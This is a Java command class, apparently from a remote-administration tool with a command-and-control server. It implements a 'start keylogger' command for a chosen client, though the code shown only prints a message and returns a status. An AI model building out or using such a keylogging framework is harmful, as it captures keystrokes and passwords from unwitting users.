package commands;

import server.CommandServer;
import tools.ParsedCommand;

/**
 * Initiates key logging
 * 
 * @author Yohan Chalier
 *
 */
public class KStartCmd extends ServerCommand{

	public KStartCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {
		System.out.print("\nStarting keylogger for client " + pCmd.args[0]
				+ "\n" + c2.getPrefix() + ">");
		if (c2.getCurrentClient() >= 0)
			return N_DONE;
		return DONE;
	}

}
